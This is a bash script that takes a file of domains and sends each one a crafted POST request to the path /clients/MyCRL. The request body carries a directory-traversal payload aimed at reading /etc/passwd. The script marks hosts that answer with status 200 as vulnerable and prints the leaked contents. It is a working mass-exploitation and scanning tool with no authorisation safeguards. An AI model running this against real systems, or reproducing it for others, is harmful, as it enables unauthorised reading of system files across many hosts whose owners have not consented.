#!/bin/bash

# Check if curl is installed, if not, install it
if ! command -v curl &> /dev/null; then
    echo "curl is not installed. Installing curl..."
    sudo apt install curl
fi

# Function to display usage instructions
usage() {
    echo "Usage: $0 -d <domains_file>"
    exit 1
}

# Parse command-line options
while getopts ":d:" opt; do
    case ${opt} in
        d )
            domains_file=$OPTARG
            ;;
        \? )
            usage
            ;;
    esac
done

# Check if domains file is provided
if [ -z "$domains_file" ]; then
    usage
fi

# Check if the domains file exists
if [ ! -f "$domains_file" ]; then
    echo "Domains file not found: $domains_file"
    exit 1
fi

# Define color for output
RED='\033[0;31m'
NC='\033[0m' # No Color
SEPARATOR="-----------------------------------------------------"

# Loop through each domain/IP in the file and run the curl command
while IFS= read -r domain; do
    echo "Running curl command for: $domain"
    response=$(curl --path-as-is -i -s -k -X POST \
        -H "Host: $domain" \
        -H "Content-Length: 39" \
        -H "Connection: keep-alive" \
        --data-binary 'aCSHELL/../../../../../../../etc/passwd' \
        --max-time 10 \
        "https://$domain/clients/MyCRL")
    
    # Extract the HTTP status code from the response
    http_status=$(echo "$response" | grep HTTP | awk '{print $2}')

    # Check if the HTTP status code is 200
    if [ "$http_status" == "200" ]; then
        echo -e "${RED}$domain is vulnerable${NC}"
        echo "$response"
    else
        echo "Received HTTP status $http_status for $domain. Skipping to the next domain."
    fi

    # Print a separator for clarity
    echo "$SEPARATOR"
done < "$domains_file"
